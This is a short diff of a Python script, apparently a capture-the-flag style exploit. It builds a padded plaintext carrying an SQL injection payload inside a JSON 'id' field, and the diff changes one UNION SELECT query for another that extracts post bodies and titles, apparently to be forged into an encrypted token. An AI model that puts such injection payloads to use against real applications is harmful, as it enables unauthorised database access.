@@ -88,7 +88,7 @@ if __name__ == '__main__':
         endoded : 2ccff8244bc03206004dbafab8a2945acb0938b06353283286895e3ec53ed99d272d2907ff5eafc88c3ac73d83a197e633de607fdbaffd7c9b71f57fd4ca21da67dbbf255cf6b56fbe89e7194c4e482c
     """
 
-    plaintext = pad(b'{"id":"\' union select body, title from posts order by id asc limit 1 #", "key":"1"}')
+    plaintext = pad(b'{"id":"0 union select body, title from posts where id = 1", "key":"1"}')
     plains = obtener_bloques(plaintext)
     print(plains)
 
